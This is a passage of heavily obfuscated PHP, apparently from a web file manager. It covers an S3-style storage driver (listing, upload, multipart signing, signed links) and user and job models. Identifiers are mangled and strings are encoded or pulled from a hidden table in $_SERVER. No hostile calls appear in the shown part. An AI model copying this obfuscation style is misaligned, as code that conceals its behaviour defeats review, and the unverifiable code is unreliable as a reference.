$ÆÚç„Û˝ ? $this->getPathOuter($ÇŒ¢‹üö) : !1; return $ÆÚç„Û˝; } public function moveFile($ıƒ§Ç≈È, $ÊœÖºﬂó) { if ($this->copyFile($ıƒ§Ç≈È, $ÊœÖºﬂó)) { $this->delFile($ıƒ§Ç≈È); return $this->getPathOuter($ÊœÖºﬂó); } return !1; } public function delFile($≤∑ÿÛ÷ê) { return $this->client->deleteObject($this->bucket, $≤∑ÿÛ÷ê); } public function delFolder($ñÄñ‡Á∑) { $˚ÍíÇÛ˜ =& $_SERVER[ëæªã÷]; if (!$this->exist($ñÄñ‡Á∑)) { return !0; } $this->listItemCache = !1; $Æ«–∂¢â = $this->fileList($ñÄñ‡Á∑); $this->listItemCache = !0; $î∂Õß´¯ = trim($ñÄñ‡Á∑, $˚ÍíÇÛ˜[8]) . $˚ÍíÇÛ˜[8]; if (!empty($ñÄñ‡Á∑) && $ñÄñ‡Á∑ !== $˚ÍíÇÛ˜[200] && !in_array($î∂Õß´¯, $Æ«–∂¢â[$˚ÍíÇÛ˜[87]])) { $Æ«–∂¢â[$˚ÍíÇÛ˜[87]][] = $î∂Õß´¯; } $≈“øƒá” = $this->delByBatch($Æ«–∂¢â[$˚ÍíÇÛ˜[86]]); if (!$≈“øƒá”) { return !1; } $≈“øƒá” = $this->delByBatch($Æ«–∂¢â[$˚ÍíÇÛ˜[87]]); if (!$≈“øƒá”) { return !1; } return $this->delFile($î∂Õß´¯); } private function delByBatch($ßèÒ»‘Ø) { foreach (array_chunk($ßèÒ»‘Ø, 1000) as $Ïû–øæã) { $Ω–˜ª∆¢ = $this->client->deleteObjects($this->bucket, $Ïû–øæã); if (!$Ω–˜ª∆¢) { return !1; } } return !0; } public function rename($Â©êÂÈö, $∂ÙË–∑Å) { return $this->renameObject($Â©êÂÈö, $∂ÙË–∑Å); } public function listPath($ä›¸”€ , $ïùœΩµ£ = false) { $ÚÿŒ∑®Ù =& $_SERVER[ëæªã÷]; $®˚´‡ª” = $this->fileList($ä›¸”€ , $ÚÿŒ∑®Ù[8], !0); foreach ($®˚´‡ª”[$ÚÿŒ∑®Ù[87]] as $Ωéç‹÷œ => $Ñª∂‡çß) { $®˚´‡ª”[$ÚÿŒ∑®Ù[87]][$Ωéç‹÷œ] = $this->folderInfo($Ñª∂‡çß, $ïùœΩµ£); } foreach ($®˚´‡ª”[$ÚÿŒ∑®Ù[86]] as $Ωéç‹÷œ => $Ñª∂‡çß) { $®˚´‡ª”[$ÚÿŒ∑®Ù[86]][$Ωéç‹÷œ] = $this->fileInfo($Ñª∂‡çß[$ÚÿŒ∑®Ù[32]], $ïùœΩµ£, $Ñª∂‡çß); } return $®˚´‡ª”; } private function fileInfo($ü∫ËÛø«, $”–Úµ¸⁄ = false, $¶—´åü£ = array()) { $ıøÊ∂„È =& $_SERVER[ëæªã÷]; $Ø÷¿î®ÿ = array($ıøÊ∂„È[32] => $this->pathThis($ü∫ËÛø«), $ıøÊ∂„È[88] => $this->getPathOuter($ü∫ËÛø«), $ıøÊ∂„È[33] => $ıøÊ∂„È[202], $ıøÊ∂„È[177] => $this->ext($ü∫ËÛø«), $ıøÊ∂„È[90] => isset($¶—´åü£[$ıøÊ∂„È[90]]) ? $¶—´åü£[$ıøÊ∂„È[90]] : 0); if ($”–Úµ¸⁄) { return $Ø÷¿î®ÿ; } $Ø÷¿î®ÿ[$ıøÊ∂„È[203]] = $Ø÷¿î®ÿ[$ıøÊ∂„È[96]] = 0; $Ø÷¿î®ÿ[$ıøÊ∂„È[204]] = $Ø÷¿î®ÿ[$ıøÊ∂„È[205]] = !0; if (empty($¶—´åü£)) { $¶—´åü£ = $this->objectMeta($ü∫ËÛø«); if (!$¶—´åü£) { return $Ø÷¿î®ÿ; } } if (isset($¶—´åü£[$ıøÊ∂„È[206]])) { $Ø÷¿î®ÿ[$ıøÊ∂„È[96]] = $¶—´åü£[$ıøÊ∂„È[206]]; } if (isset($¶—´åü£[$ıøÊ∂„È[90]])) { $Ø÷¿î®ÿ[$ıøÊ∂„È[90]] = $¶—´åü£[$ıøÊ∂„È[90]]; } return $Ø÷¿î®ÿ; } private function folderInfo($πµ∑›œ⁄, $⁄±˘ù©’ = false) { $‹úÌ◊±í =& $_SERVER[ëæªã÷]; $¡ ËÁˆß = array($‹úÌ◊±í[32] => $this->pathThis($πµ∑›œ⁄), $‹úÌ◊±í[88] => $this->getPathOuter($‹úÌ◊±í[8] . $πµ∑›œ⁄), $‹úÌ◊±í[33] => $‹úÌ◊±í[89]); if ($⁄±˘ù©’) { return $¡ ËÁˆß; } $¡ ËÁˆß[$‹úÌ◊±í[203]] = $¡ ËÁˆß[$‹úÌ◊±í[96]] = 0; $¡ ËÁˆß[$‹úÌ◊±í[204]] = $¡ ËÁˆß[$‹úÌ◊±í[205]] = !0; if ($πµ∑›œ⁄ == $‹úÌ◊±í[12]) { return $¡ ËÁˆß; } $πµ∑›œ⁄ = trim($πµ∑›œ⁄, $‹úÌ◊±í[8]) . $‹úÌ◊±í[8]; $Ãó∑¶ Î = $this->objectMeta($πµ∑›œ⁄); if (isset($Ãó∑¶ Î[$‹úÌ◊±í[206]])) { $¡ ËÁˆß[$‹úÌ◊±í[203]] = $Ãó∑¶ Î[$‹úÌ◊±í[206]]; } return $¡ ËÁˆß; } private function fileList($Ñ§‡ºßä, $»Û÷ÁÄ˝ = '', $üÏ¢≥üÔ = 0) { $™Ôû‹ıó =& $_SERVER[ëæªã÷]; $¶÷µ∞µâ = rtrim($Ñ§‡ºßä, $™Ôû‹ıó[8]) . $™Ôû‹ıó[8]; $›∑Ëä‡é = $this->listObjs($¶÷µ∞µâ, null, null, $»Û÷ÁÄ˝); if (!$›∑Ëä‡é) { return array($™Ôû‹ıó[87] => array(), $™Ôû‹ıó[86] => array()); } $ÒëﬁÓûì = $this->listItemCache === !1 ? !1 : !0; $ãôôº∞ﬁ = $ôƒ‡Âæì = array(); foreach ($›∑Ëä‡é[$™Ôû‹ıó[207]] as $•∞”ú¿À) { $ü’úÑ¢• = $•∞”ú¿À[$™Ôû‹ıó[32]]; if ($ü’úÑ¢• == $¶÷µ∞µâ) { continue; } $Ô¶Å˚˘† = isset($•∞”ú¿À[$™Ôû‹ıó[90]]) ? $•∞”ú¿À[$™Ôû‹ıó[90]] : 0; $∞õ¸Û¢ = $Ô¶Å˚˘† == 0 && substr($ü’úÑ¢•, strlen($ü’úÑ¢•) - 1, 1) == $™Ôû‹ıó[8] ? !0 : !1; if ($ÒëﬁÓûì) { $this->cacheMethod($™Ôû‹ıó[208], $ü’úÑ¢•, $∞õ¸Û¢); $this->cacheMethod($™Ôû‹ıó[209], $ü’úÑ¢•, $•∞”ú¿À); } if ($∞õ¸Û¢) { $ãôôº∞ﬁ[] = $ü’úÑ¢•; continue; } $ôƒ‡Âæì[] = $üÏ¢≥üÔ ? $•∞”ú¿À : $ü’úÑ¢•; } foreach ($›∑Ëä‡é[$™Ôû‹ıó[210]] as $•∞”ú¿À) { $ãôôº∞ﬁ[] = $•∞”ú¿À[$™Ôû‹ıó[32]]; if ($ÒëﬁÓûì) { $this->cacheMethod($™Ôû‹ıó[208], $•∞”ú¿À[$™Ôû‹ıó[32]], !0); } } if ($ÒëﬁÓûì) { $this->cacheMethod($™Ôû‹ıó[208], $Ñ§‡ºßä, !0); } return array($™Ôû‹ıó[87] => $ãôôº∞ﬁ, $™Ôû‹ıó[86] => $ôƒ‡Âæì); } private function listObjs($µ¨åÿÛ£, $∞›—Ôæ™ = null, $µÏú≈Œø = null, $∑  Á’ù = null) { $∞ôÿ”›‚ =& $_SERVER[ëæªã÷]; $µ¨åÿÛ£ = trim($µ¨åÿÛ£, $∞ôÿ”›‚[8]); $Ä∫‡ûñ÷ = empty($µ¨åÿÛ£) && $µ¨åÿÛ£ !== $∞ôÿ”›‚[200] ? $∞ôÿ”›‚[12] : $µ¨åÿÛ£ . $∞ôÿ”›‚[8]; return $this->client->getBucket($this->bucket, $Ä∫‡ûñ÷, $∞›—Ôæ™, $µÏú≈Œø, $∑  Á’ù, !0); } public function has($ÇÏûÎçÖ, $æ’¨—“ü = false, $·˛•ùÖƒ = true) { $ëôﬁîı  =& $_SERVER[ëæªã÷]; $ÇÏûÎçÖ = trim($ÇÏûÎçÖ, $ëôﬁîı [8]); $„ÁﬁÚ„€ = empty($ÇÏûÎçÖ) && $ÇÏûÎçÖ !== $ëôﬁîı [200] ? $ëôﬁîı [12] : $ÇÏûÎçÖ . $ëôﬁîı [8]; $∆÷¶ê¸« = null; $Ìã‹‹˝À = 500; $£¶òÍ˛Ç = $ëôﬁîı [8]; $ΩÌÎ‹ˆ≠ = $˚¿çùäÆ = array(); while (!0) { $®Ë›∏†Œ = $this->listObjs($ÇÏûÎçÖ, $∆÷¶ê¸«, $Ìã‹‹˝À, $£¶òÍ˛Ç); if (!$®Ë›∏†Œ) { break; } $∆÷¶ê¸« = $®Ë›∏†Œ[$ëôﬁîı [211]]; $ÅﬁÎÇ÷… = $®Ë›∏†Œ[$ëôﬁîı [207]]; $“êæΩÌù = $®Ë›∏†Œ[$ëôﬁîı [210]]; if (empty($ÅﬁÎÇ÷…) && empty($“êæΩÌù)) { break; } if (count($ÅﬁÎÇ÷…) == 1 && $ÅﬁÎÇ÷…[0][$ëôﬁîı [32]] == $„ÁﬁÚ„€) { break; } if ($æ’¨—“ü) { if (count($ÅﬁÎÇ÷…)) { $ÅﬁÎÇ÷… = array_column($ÅﬁÎÇ÷…, $ëôﬁîı [32]); $ΩÌÎ‹ˆ≠ = array_merge($ΩÌÎ‹ˆ≠, $ÅﬁÎÇ÷…); } if (count($“êæΩÌù)) { $“êæΩÌù = array_column($“êæΩÌù, $ëôﬁîı [32]); $˚¿çùäÆ = array_merge($˚¿çùäÆ, $“êæΩÌù); } if ($∆÷¶ê¸« === null) { break; } continue; } if ($·˛•ùÖƒ) { if (!empty($ÅﬁÎÇ÷…)) { if (count($ÅﬁÎÇ÷…) > 1 || isset($ÅﬁÎÇ÷…[0][$ëôﬁîı [32]]) && $ÅﬁÎÇ÷…[0][$ëôﬁîı [32]] != $„ÁﬁÚ„€) { return !0; } } } else { if (!empty($“êæΩÌù)) { return !0; } } if ($∆÷¶ê¸« === null) { break; } } if ($æ’¨—“ü) { $ΩÌÎ‹ˆ≠ = array_diff($ΩÌÎ‹ˆ≠, array($„ÁﬁÚ„€)); $ΩÌÎ‹ˆ≠ = count(array_unique($ΩÌÎ‹ˆ≠)); $˚¿çùäÆ = count(array_unique($˚¿çùäÆ)); return array($ëôﬁîı [212] => $ΩÌÎ‹ˆ≠, $ëôﬁîı [213] => $˚¿çùäÆ); } return !1; } public function listAll($Ì∏Îœ∞ı) { $∆•ïû˝õ =& $_SERVER[ëæªã÷]; $¸ì®÷Î = $this->fileList($Ì∏Îœ∞ı, $∆•ïû˝õ[12], !0); $®ÄÍ∞ÿÜ = array(); foreach ($¸ì®÷Î[$∆•ïû˝õ[86]] as $“¬Ÿ‚˙æ) { $®ÄÍ∞ÿÜ[$“¬Ÿ‚˙æ[$∆•ïû˝õ[32]]] = $“¬Ÿ‚˙æ[$∆•ïû˝õ[90]]; } foreach ($¸ì®÷Î[$∆•ïû˝õ[87]] as $“¬Ÿ‚˙æ) { if (is_string($“¬Ÿ‚˙æ)) { $®ÄÍ∞ÿÜ[$“¬Ÿ‚˙æ] = 0; } } return $this->listAllFiles($Ì∏Îœ∞ı, array_keys($®ÄÍ∞ÿÜ), $®ÄÍ∞ÿÜ); } public function canRead($ÇÃ£üµ§) { $ÿù‡Æûè =& $_SERVER[ëæªã÷]; $ö÷üÀ⁄° = $this->client->getAccessControlPolicy($this->bucket, $ÇÃ£üµ§); if (!$ö÷üÀ⁄°) { return !1; } return in_array($ö÷üÀ⁄°, array($ÿù‡Æûè[214], $ÿù‡Æûè[215], $ÿù‡Æûè[216])) ? !0 : !1; } public function canWrite($ìãÓ˛Û˝) { $ÏΩ∂µ – =& $_SERVER[ëæªã÷]; $”∂‰Ωå€ = $this->client->getAccessControlPolicy($this->bucket, $ìãÓ˛Û˝); if (!$”∂‰Ωå€) { return !1; } return in_array($”∂‰Ωå€, array($ÏΩ∂µ –[214], $ÏΩ∂µ –[215])) ? !0 : !1; } public function getContent($œ´ÚÁ≠ﬂ) { return $this->client->getObject($this->bucket, $œ´ÚÁ≠ﬂ); } public function setContent($’ûﬁˆÍ¸, $ŒÒ‡ú⁄ª = '', $ã»õ˝»© = false) { $…¡Õ–Í¥ =& $_SERVER[ëæªã÷]; $’ûﬁˆÍ¸ = $ã»õ˝»© ? trim($’ûﬁˆÍ¸, $…¡Õ–Í¥[8]) . $…¡Õ–Í¥[8] : $’ûﬁˆÍ¸; $¡æô§˚Ì = get_file_mime(get_path_ext($’ûﬁˆÍ¸)); $Û—ƒù¢ó = $this->client->putObject($ŒÒ‡ú⁄ª, $this->bucket, $’ûﬁˆÍ¸, $…¡Õ–Í¥[201], array(), $¡æô§˚Ì); if (!$Û—ƒù¢ó) { return !1; } if ($ã»õ˝»©) { return !0; } $this->cacheMethod(null, null); $Û—ƒù¢ó = $this->copyFile($’ûﬁˆÍ¸, $’ûﬁˆÍ¸, array($…¡Õ–Í¥[217] => $Û—ƒù¢ó[$…¡Õ–Í¥[218]])); return $Û—ƒù¢ó ? !0 : !1; } public function fileSubstr($À¶ÂÏß˜, $à•ËÔå , $Ë ª·Ì™) { $Äü»ƒ¬ı = $à•ËÔå  + $Ë ª·Ì™ - 1; return $this->client->getObject($this->bucket, $À¶ÂÏß˜, array($_SERVER[ëæªã÷][219] => "\142\x79\x74\145\163\x3d{$à•ËÔå }\55{$Äü»ƒ¬ı}")); } public function upload($ê“√˙⁄, $ §å≈Œô, $Û√â€∆› = false, $∆‹Àß–‹ = REPEAT_REPLACE) { $≥Í¬≥®∞ =& $_SERVER[ëæªã÷]; $£ïºÚ™ÿ = array($≥Í¬≥®∞[217] => @md5_file($ §å≈Œô)); $—ﬁ„Æ⁄£ = array($≥Í¬≥®∞[220] => get_file_mime(get_path_ext($ê“√˙⁄))); if (IO::size($ §å≈Œô) <= 1024 * 1024 * 200) { $¸¥ô⁄ª˝ = $this->client->putObjectFile($ §å≈Œô, $this->bucket, $ê“√˙⁄, $≥Í¬≥®∞[201], $£ïºÚ™ÿ, $—ﬁ„Æ⁄£); return !empty($¸¥ô⁄ª˝) ? $this->getPathOuter($ê“√˙⁄) : !1; } $˚‰çÃ≈ˆ = $this->client->multiUploadObject($ §å≈Œô, $this->bucket, trim($ê“√˙⁄, $≥Í¬≥®∞[8]), $£ïºÚ™ÿ, $—ﬁ„Æ⁄£); return $˚‰çÃ≈ˆ ? $this->getPathOuter($ê“√˙⁄) : !1; } public function download($ﬂ≤∂ô»˚, $ÕΩ¢Òƒ) { if (!@is_dir($this->pathFather($ÕΩ¢Òƒ)) && !IO::mkdir($this->pathFather($ÕΩ¢Òƒ))) { return !1; } $ﬂﬂ·äãõ = $this->client->getObject($this->bucket, $ﬂ≤∂ô»˚, array(), $ÕΩ¢Òƒ); return $ﬂﬂ·äãõ !== !1 ? $ÕΩ¢Òƒ : !1; } public function link($ãÒä›Î¸, $Ì¥Úﬁ⁄ = array()) { $Ö⁄¨¯Û’ =& $_SERVER[ëæªã÷]; if ($this->signVer == $Ö⁄¨¯Û’[221]) { return $this->client->getAuthenticatedURL($this->bucket, $ãÒä›Î¸, 3600 * 12, $Ì¥Úﬁ⁄); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ãÒä›Î¸, $Ö⁄¨¯Û’[8]), 3600 * 12, $this->region, array(), !0, $Ì¥Úﬁ⁄); } public function fileOut($Èƒ…ØåÊ, $–ôö£´º = false, $≈™Ê£Ü = false, $Ÿï¨ÏÊÛ = '') { $ñ˝‹À√Õ =& $_SERVER[ëæªã÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($Èƒ…ØåÊ, $–ôö£´º, $≈™Ê£Ü, $Ÿï¨ÏÊÛ); } if (!$≈™Ê£Ü) { $≈™Ê£Ü = $this->pathThis($Èƒ…ØåÊ); } $ı∏Ù ›˝ = get_file_mime(get_path_ext($≈™Ê£Ü)); if ($ı∏Ù ›˝ == $ñ˝‹À√Õ[222]) { return parent::fileOut($Èƒ…ØåÊ, $–ôö£´º, $≈™Ê£Ü, $Ÿï¨ÏÊÛ); } $Ñ¶÷∑Óµ = array($ñ˝‹À√Õ[223] => $ı∏Ù ›˝); if ($–ôö£´º) { $Ñ¶÷∑Óµ[$ñ˝‹À√Õ[224]] = $ñ˝‹À√Õ[225] . rawurlencode($≈™Ê£Ü); } else { } $ÌÅΩÆ≈ã = $this->link($Èƒ…ØåÊ, $Ñ¶÷∑Óµ); $this->fileOutLink($ÌÅΩÆ≈ã); } public function fileOutServer($éΩèÆ¶∫, $€”ëˆ«ø = false, $ëÈ∞Ö¯á = false, $ŒÇÅ¿àﬁ = '') { parent::fileOut($éΩèÆ¶∫, $€”ëˆ«ø, $ëÈ∞Ö¯á, $ŒÇÅ¿àﬁ); } public function fileOutImageServer($™«‡Ùπç, $ò∏Ø≥Åü = 250) { parent::fileOutImage($™«‡Ùπç, $ò∏Ø≥Åü); } public function hashMd5($¶¯˜’»«, $»«¯Ÿ¶ó = '') { $ˆÁº˜ß° =& $_SERVER[ëæªã÷]; $¶´êï·Ê = $this->objectMeta($¶¯˜’»«); if (!$¶´êï·Ê) { return !1; } $»«¯Ÿ¶ó = $»«¯Ÿ¶ó ? $»«¯Ÿ¶ó : _get($¶´êï·Ê, $ˆÁº˜ß°[226]); $»«¯Ÿ¶ó = $»«¯Ÿ¶ó ? $»«¯Ÿ¶ó : _get($¶´êï·Ê, $ˆÁº˜ß°[218], $ˆÁº˜ß°[12]); return $»«¯Ÿ¶ó; } public function uploadFormData($ﬁ›ËÔˆ‡, $ï∆ÇÑ÷¡ = 3600) { $˛≤Ë˜Ç =& $_SERVER[ëæªã÷]; $Ω•£≈Â˛ = $this->pathFather($ﬁ›ËÔˆ‡); $é’º≥§¸ = $this->client->getHttpUploadPostParams($this->bucket, $Ω•£≈Â˛, $˛≤Ë˜Ç[201], $ï∆ÇÑ÷¡); return array_merge((array) $é’º≥§¸, array($˛≤Ë˜Ç[184] => $this->getHost())); } public function multiUploadFormData($âô—œÀ§, $ä‚ÿÛ≠‚ = 3600) { $œ˙´û€‚ =& $_SERVER[ëæªã÷]; $óöÔÇµ = gmdate($œ˙´û€‚[227]); $ß∆∆Ú≥Ô = array(); $◊˛»Êø” = $this->client->getUploadId($this->bucket, $âô—œÀ§, $ß∆∆Ú≥Ô); if (!$◊˛»Êø”) { return !1; } return array($œ˙´û€‚[228] => $◊˛»Êø”, $œ˙´û€‚[184] => $this->getHost() . $œ˙´û€‚[8] . $this->pathEncode($âô—œÀ§), $œ˙´û€‚[229] => $óöÔÇµ, $œ˙´û€‚[105] => $âô—œÀ§); } public function multiUploadAuthData($’¬ÓπäÄ, $Œ‚ôØê” = array()) { $·ò©˜÷˜ =& $_SERVER[ëæªã÷]; $ü·ïäÙ≥ = isset($Œ‚ôØê”[$·ò©˜÷˜[229]]) ? $Œ‚ôØê”[$·ò©˜÷˜[229]] : gmdate($·ò©˜÷˜[227]); $ËæÀ ç© = isset($Œ‚ôØê”[$·ò©˜÷˜[177]]) ? $Œ‚ôØê”[$·ò©˜÷˜[177]] : $·ò©˜÷˜[12]; $∂ö“ãäß = $Œ‚ôØê”[$·ò©˜÷˜[105]]; unset($Œ‚ôØê”[$·ò©˜÷˜[105]]); if (isset($Œ‚ôØê”[$·ò©˜÷˜[230]])) { $Œ‚ôØê”[$·ò©˜÷˜[229]] = $ü·ïäÙ≥; return $this->listUploadParts($∂ö“ãäß, $Œ‚ôØê”); } $Ò˚ÖÌ¥ç = array($·ò©˜÷˜[231], $·ò©˜÷˜[12], $·ò©˜÷˜[128], $·ò©˜÷˜[12], "\170\55\141\155\x7a\x2d\x64\x61\164\x65\x3a{$ü·ïäÙ≥}", $·ò©˜÷˜[8] . $this->bucket . $·ò©˜÷˜[8] . $this->pathEncode($∂ö“ãäß) . $ËæÀ ç©); if (strpos($ËæÀ ç©, $·ò©˜÷˜[232]) === 0) { $Ò˚ÖÌ¥ç[0] = $·ò©˜÷˜[233]; } if (isset($Œ‚ôØê”[$·ò©˜÷˜[234]]) && $Œ‚ôØê”[$·ò©˜÷˜[234]] == $·ò©˜÷˜[235]) { $Ò˚ÖÌ¥ç[0] = $·ò©˜÷˜[235]; } $ïéˆÇÜÜ = implode($·ò©˜÷˜[65], $Ò˚ÖÌ¥ç); $õí…˜î = base64_encode(hash_hmac($·ò©˜÷˜[236], $ïéˆÇÜÜ, $this->secret, !0)); $àÚÍ“Ìü = $·ò©˜÷˜[237] . $this->accessKey . $·ò©˜÷˜[4] . $õí…˜î; if (strpos($ËæÀ ç©, $·ò©˜÷˜[232]) === 0) { return array($·ò©˜÷˜[238] => $àÚÍ“Ìü, $·ò©˜÷˜[229] => $ü·ïäÙ≥); } return $àÚÍ“Ìü; } public function listUploadParts($–…Ÿ∞ìµ, $û≤ß–±ì = array()) { $ø”∫íûÓ =& $_SERVER[ëæªã÷]; $éÖÜÿèÖ = str_replace($ø”∫íûÓ[239], $ø”∫íûÓ[12], $û≤ß–±ì[$ø”∫íûÓ[177]]); $ãÜú◊˚« = $this->client->listParts($this->bucket, $–…Ÿ∞ìµ, $éÖÜÿèÖ); if (!$ãÜú◊˚«) { return !1; } unset($û≤ß–±ì[$ø”∫íûÓ[230]], $û≤ß–±ì[$ø”∫íûÓ[234]]); $û≤ß–±ì[$ø”∫íûÓ[105]] = $–…Ÿ∞ìµ; $ ÊÂÊÔ» = $this->multiUploadAuthData($–…Ÿ∞ìµ, $û≤ß–±ì); if (empty($ ÊÂÊÔ»)) { return !1; } return array($ø”∫íûÓ[238] => $ ÊÂÊÔ», $ø”∫íûÓ[229] => $û≤ß–±ì[$ø”∫íûÓ[229]], $ø”∫íûÓ[240] => $ãÜú◊˚«); } public function getHost() { return parent::getHost() . $_SERVER[ëæªã÷][8] . $this->bucket; } public function size($ Æ–ûƒ©) { $´ΩÊ˙Üì = $this->objectMeta($ Æ–ûƒ©); return $´ΩÊ˙Üì ? $´ΩÊ˙Üì[$_SERVER[ëæªã÷][90]] : 0; } public function info($ìÆã™≠”) { if ($this->isFolder($ìÆã™≠”)) { return $this->folderInfo($ìÆã™≠”); } else { if ($this->isFile($ìÆã™≠”)) { return $this->fileInfo($ìÆã™≠”); } } return !1; } public function exist($„êﬁÍÃá) { return $this->isFile($„êﬁÍÃá) || $this->isFolder($„êﬁÍÃá); } public function isFile($‰üòñ‚≤) { return !$this->isFolder($‰üòñ‚≤) && $this->objectMeta($‰üòñ‚≤); } public function isFolder($ûŸˆæ¸∆) { return $this->cacheMethod($_SERVER[ëæªã÷][208], $ûŸˆæ¸∆); } protected function objectMeta($˙†ÛÂí˛) { return $this->cacheMethod($_SERVER[ëæªã÷][209], $˙†ÛÂí˛); } protected function _objectMeta($òõå˙‚´) { $—óÊ•”Ô =& $_SERVER[ëæªã÷]; $òõå˙‚´ = rtrim($òõå˙‚´, $—óÊ•”Ô[8]); try { $ûÅ®ï≠Ø = $this->client->getObjectInfo($this->bucket, $òõå˙‚´); if (!isset($ûÅ®ï≠Ø[$—óÊ•”Ô[226]]) && isset($ûÅ®ï≠Ø[$—óÊ•”Ô[241]])) { $ûÅ®ï≠Ø[$—óÊ•”Ô[226]] = $ûÅ®ï≠Ø[$—óÊ•”Ô[241]]; } } catch (Exception $àö¸ˆä⁄) { $ûÅ®ï≠Ø = !1; } if (!$ûÅ®ï≠Ø) { } return $ûÅ®ï≠Ø; } protected function _isFolder($ÛâÏ≠˘Œ) { $„¢ï˙≠Ø =& $_SERVER[ëæªã÷]; $ÛâÏ≠˘Œ = rtrim($ÛâÏ≠˘Œ, $„¢ï˙≠Ø[8]); if ($ÛâÏ≠˘Œ == $„¢ï˙≠Ø[12] || $ÛâÏ≠˘Œ == $„¢ï˙≠Ø[8]) { return !0; } $ßÓ£›˘¸ = $this->client->getBucket($this->bucket, $ÛâÏ≠˘Œ, null, 1); if (empty($ßÓ£›˘¸[$„¢ï˙≠Ø[207]])) { return !1; } $‡¬‰óïñ = $ßÓ£›˘¸[$„¢ï˙≠Ø[207]][0][$„¢ï˙≠Ø[32]]; return stripos($‡¬‰óïñ, $ÛâÏ≠˘Œ . $„¢ï˙≠Ø[8]) === 0 ? !0 : !1; if (substr($‡¬‰óïñ, -1) == $„¢ï˙≠Ø[8]) { return !0; } if (get_path_this($‡¬‰óïñ) == get_path_this($ÛâÏ≠˘Œ)) { return !1; } return !0; } } goto B¨Áë˘±â™; eûõçﬂå›ß: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x6a\x6f\142\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x64\145\x73\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\145\154\146\x4a\157\142\x4c\x69\x73\x74"; public function listData($øîá»´Û = false, $≠ÄÒÕ¸° = "\163\x6f\x72\164", $”†¿∞âÿ = false) { return parent::listData($øîá»´Û, $≠ÄÒÕ¸°, $”†¿∞âÿ); } public function remove($Ç¿∆°œ„) { return parent::remove($Ç¿∆°œ„); } public function add($¬≠¡ÜˆÈ) { $Ç’∆ÅœÎ =& $_SERVER[ëæªã÷]; if ($this->findByName($¬≠¡ÜˆÈ[$Ç’∆ÅœÎ[32]])) { return !1; } $¬≠¡ÜˆÈ[$Ç’∆ÅœÎ[1819]] = $this->getSort(); return parent::insert($¬≠¡ÜˆÈ); } private function getSort() { $êÜ⁄‡©ú =& $_SERVER[ëæªã÷]; $ãü¨áé˚ = parent::listData(); $á¡¡Í≈° = array_to_keyvalue($ãü¨áé˚, $êÜ⁄‡©ú[12], $êÜ⁄‡©ú[1819]); return empty($á¡¡Í≈°) ? 0 : max($á¡¡Í≈°) + 1; } public function update($»œúﬂ˛⁄, $‰¢àÛê¡) { $˜§ﬂµßä =& $_SERVER[ëæªã÷]; $€◊∞⁄æ∫ = parent::listData($»œúﬂ˛⁄); $ﬂ˜õ˜ƒ = $this->findByName($‰¢àÛê¡[$˜§ﬂµßä[32]]); if (!$€◊∞⁄æ∫ || $ﬂ˜õ˜ƒ && $ﬂ˜õ˜ƒ[$˜§ﬂµßä[401]] != $€◊∞⁄æ∫[$˜§ﬂµßä[401]]) { return !1; } return parent::update($»œúﬂ˛⁄, $‰¢àÛê¡); } public function setUserJob($¸Ö◊ÿÀ‹, $¡õ†—·Á) { $Ù•å¸èî =& $_SERVER[ëæªã÷]; if (!is_array($¡õ†—·Á)) { $¡õ†—·Á = array($¡õ†—·Á); } $àﬁÌ¶∑⁄ = parent::listData(); $Ò≈àÎ±¢ = array_to_keyvalue($àﬁÌ¶∑⁄, $Ù•å¸èî[32]); $˚ìÙ≈≤Ê = $Ù•å¸èî[382]; foreach ($¡õ†—·Á as $¸è†ÖäÎ) { if ($Ò≈àÎ±¢[$¸è†ÖäÎ]) { $˚ìÙ≈≤Ê .= $Ò≈àÎ±¢[$¸è†ÖäÎ][$Ù•å¸èî[401]] . $Ù•å¸èî[50]; } else { $’Ü⁄›Á¢ = $this->add($¸è†ÖäÎ); $˚ìÙ≈≤Ê .= $’Ü⁄›Á¢ . $Ù•å¸èî[50]; } } $˚ìÙ≈≤Ê = rtrim($˚ìÙ≈≤Ê, $Ù•å¸èî[50]); Model($Ù•å¸èî[538])->metaSet($¸Ö◊ÿÀ‹, self::JOB_KEY, $˚ìÙ≈≤Ê); } public function getUserJob($‰¡ãﬁ“º) { $û¡£∫¥ú = Model($_SERVER[ëæªã÷][538])->metaGet($‰¡ãﬁ“º); return $this->getUserJobInfo($û¡£∫¥ú[self::JOB_KEY]); } public function getUserJobInfo($à©âÿ≥ﬂ) { $Ç√≠çÔ¡ =& $_SERVER[ëæªã÷]; $≠û±û“ﬂ = explode($Ç√≠çÔ¡[50], $à©âÿ≥ﬂ); $∞èˆòüÍ = parent::listData(); $∞èˆòüÍ = array_remove_key($∞èˆòüÍ, $Ç√≠çÔ¡[203]); $°’¢›˜£ = array(); foreach ($≠û±û“ﬂ as $É´´¬´√) { if (isset($∞èˆòüÍ[$É´´¬´√])) { $°’¢›˜£[] = $∞èˆòüÍ[$É´´¬´√]; } } return $°’¢›˜£; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\155\145" => "\165\163\x65\162\137\x6d\x65\x74\141", "\x6d\x65\164\x61\x46\151\x65\x6c\144" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\x2c\x6e\x69\143\x6b\116\141\155\145\x2c\x6e\141\155\x65\54\141\166\x61\164\141\162\54\x73\145\x78\x2c\163\164\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÔΩîÁ†∂) { $æÚ°ÄûÍ =& $_SERVER[ëæªã÷]; $öÄ≤ Ãº = $æÚ°ÄûÍ[2225]; return array($æÚ°ÄûÍ[1873] => array($ÔΩîÁ†∂[0], $öÄ≤ Ãº), $æÚ°ÄûÍ[1875] => array($ÔΩîÁ†∂[0], $öÄ≤ Ãº), $æÚ°ÄûÍ[2226] => array($ÔΩîÁ†∂[0], $öÄ≤ Ãº)); } protected function getInfo($‰≥ÎøÎ„, $”ÂÍçª´ = false) { 